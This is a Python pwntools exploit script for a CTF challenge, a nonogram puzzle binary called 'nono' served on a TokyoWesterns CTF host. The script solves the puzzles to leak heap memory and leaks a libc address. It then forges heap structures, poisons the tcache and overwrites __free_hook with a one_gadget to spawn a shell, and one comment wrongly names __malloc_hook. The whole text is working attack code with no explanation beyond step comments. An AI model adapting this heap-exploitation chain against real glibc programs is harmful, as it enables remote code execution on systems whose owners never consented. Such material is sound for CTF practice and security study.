#!/usr/bin/python3

from pwn import *
from nono import Nonogram
from re import findall

exe = ELF('nono', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld.so', checksec=False)

context.binary = exe
context.terminal = 'tmux split -h'.split(' ')
context.arch = 'amd64'
# context.log_level = 'debug'


"""
0xe6ce3 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6ce6 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6ce9 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

# Manually found
0x7f1ed192baf1 <__execvpe+641>:      mov    rsi,r15
0x7f1ed192baf4 <__execvpe+644>:      lea    rdi,[rip+0xd0aaf]        # 0x7f1ed19fc5aa
0x7f1ed192bafb <__execvpe+651>:      call   0x7f1ed192b160 <execve>
"""

og_off = 0xe6af1

for _ in range(20): # Loops to address puzzles with more than one solution. If the script does not find the expected one, the program will exit after failure!
    try:
        if args.REMOTE:
            p = remote('pwn03.chal.ctf.westerns.tokyo', 22915)
        else:
            p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
            # p = process(exe.path)

            if args.GDB:
                gdb.attach(p, '''
                    brva 0x3136
                    continue
                    ''')

        def get_leaks(base, solution, size):
            stream = ''
            for index in range(0x400 * 8 - base, 2 * size):
                c = index // size
                r = index % size
                stream += str(solution[r][c])
            
            codes = bytes([int(x[::-1], 2) for x in findall('.{8}', stream)])
            return codes

        def solve_nono(size, rows, columns):
            base = len(columns)-3
            nonogram = Nonogram(columns[-3:], rows)
            solution = nonogram.solve()

            for r, row in enumerate(solution):
                for c, col in enumerate(row):
                    if col == 1:
                        p.sendlineafter(b': ', f'{r} {c+base}'.encode())
                        p.recvuntil(b'Correct')
            return solution
            
        def choose(choice):
            p.sendlineafter(b': ', choice)

        def play(index, size):
            choose(b'1')
            p.sendlineafter(b'Index:\n', str(index).encode())
            
            p.recvuntil(b'Numbers\n')
            rows = [[int(n) for n in p.recvline().rstrip(b'\n,').split(b',')] for _ in range(size)]

            p.recvuntil(b'Numbers\n')
            columns = [[int(n) for n in p.recvline().rstrip(b'\n,').split(b',')] for _ in range(size)]

            log.info(f'Start solving')
            return solve_nono(size, rows, columns)

        def add(title, size, puzzle):
            choose(b'2')
            p.sendlineafter(b'Title: ', title)
            p.sendlineafter(b'Size: ', str(size).encode())
            p.sendafter(b'Puzzle: ', puzzle)

        def delete(index):
            choose(b'3')
            p.sendlineafter(b'Index:\n', str(index).encode())

        def show(index):
            choose(b'4')
            p.sendlineafter(b'Index:\n', str(index).encode())

        def quit():
            choose(b'5')

        # 1. Increase vector size

        add(b'B' * 4, 3, b'\x00')

        # 2. Leak heap addresses

        add(b'A' * 0x4, 92, b'\x00')

        solution = play(3, 92)
        # print(solution)
        base = 89 * 92
        leaks = get_leaks(base, solution, 92)
        # print(len(leaks))

        vector_begin = u64(leaks[:8])
        vector_end = u64(leaks[8:16])
        vector_limit = u64(leaks[16:].ljust(8, b'\x00'))
        big_chunk = vector_begin + 0x60

        log.info(f'v_begin = {hex(vector_begin)}')
        log.info(f'v_end = {hex(vector_end)}')
        log.info(f'v_limit = {hex(vector_limit)}')
        log.info(f'big_chunk @ {hex(big_chunk)}')

        break
    except Exception as e:
        p.close()

# 3. Make room for new puzzles on vector

delete(0)
delete(0)
delete(0)
delete(0)

add(b'B' * 0x4, 92, b'\x00')
add(b'D' * 0x20, 20, b'\x00')
add(b'C' * 0x4, 92, b'\x00')
add(b'D' * 0x20, 20, b'\x00')

delete(0)
delete(1)

# 4. Leak libc address

libc_leak_addr = big_chunk + 0x4f0

# addr: big_chunk + 0x10
fake_cont_one = p64(0) + p64(0x21) + p64(0x41) + p64(0)
# addr: big_chunk + 0x30
fake_puzzle_one = p64(0) + p64(0x41) + p64(3) + p64(big_chunk+0x20) + p64(libc_leak_addr) + p64(0x20) + p64(0x20) + p64(0)
#addr: big_chunk + 0x70
fake_vec_table = p64(0) + p64(0x21) + p64(big_chunk+0x40) + p64(0)

content = fake_cont_one + fake_puzzle_one + fake_vec_table
content = content + b'\x00' * (0x400 - len(content))

fake_vector = p64(big_chunk+0x80) + p64(big_chunk+0x88) + p64(big_chunk+0xa0)
content += fake_vector

add(b'E' * 0x4, 92, content)

libc_leak_delta = 0x1ebbe0

choose(b'4')
p.recvuntil(b'0 : ')
libc_leak = u64(p.recv(8))
libc.address = libc_leak - libc_leak_delta

log.info(f'libc_leak = {hex(libc_leak)}')
log.info(f'libc @ {hex(libc.address)}')

p.sendlineafter(b'Index:\n', b'0')

# 5. Rearrange heap

add(b'F' * 0x4, 92, b'\x00')

delete(0) # Free big_chunk_t
delete(0) # Free big_chunk

big_chunk_t = big_chunk+0x4e0

# addr: big_chunk_t + 0x10
fake_cont_two = p64(0) + p64(0x21) + p64(0x42) + p64(0)
# addr: big_chunk_t + 0x30
fake_puzzle_two = p64(0) + p64(0x41) + p64(3) + p64(big_chunk_t+0x20) + p64(big_chunk_t+0x60) + p64(0x8) + b'B' * 8 + p64(0)
# addr: big_chunk_t + 0x70
fake_vec_table = p64(0) + p64(0x31) + p64(big_chunk_t+0x40) + p64(0)

content_t = fake_cont_two + fake_puzzle_two + fake_vec_table
content_t = content_t + b'\x00' * (0x400 - len(content_t))

fake_vector = p64(big_chunk_t+0x80) + p64(big_chunk_t+0x88) + p64(big_chunk_t+0xa0)
content_t += fake_vector

add(b'G' * 0x4, 92, content_t)

# 6. Poison tcache[0x20]

tcache_safe = big_chunk - 0x12040
og_addr = libc.address + og_off
log.info(f'__malloc_hook @ {hex(libc.sym.__malloc_hook)}')
log.info(f'__free_hook @ {hex(libc.sym.__free_hook)}')
log.info(f'system @ {hex(libc.sym.system)}')
log.info(f'og @ {hex(og_addr)}')

# addr: big_chunk + 0x10
fake_cont_three = p64(0) + p64(0x21) + p64(libc.sym.__free_hook) + p64(tcache_safe)
# addr: big_chunk + 0x30
fake_vec_table = p64(0) + p64(0x31) + p64(0)

content = fake_cont_three + fake_vec_table
content = content + b'\x00' * (0x400 - len(content))

fake_vector = p64(big_chunk + 0x40) + p64(big_chunk + 0x40) + p64(big_chunk + 0x70)
content += fake_vector

add(b'H' * 0x4, 92, content)

# 7. Overwrite __malloc_hook with one_gadget

add(b'I' * 0x4, 8, b'/bin/sh\x00')
add(b'J' * 0x4, 10, p64(og_addr))

# 8. Forge another vector and forge a huge chunk to follow one_gadget constraints

add(b'K' * 0x4, 92, content)

delete(0)

p.interactive()
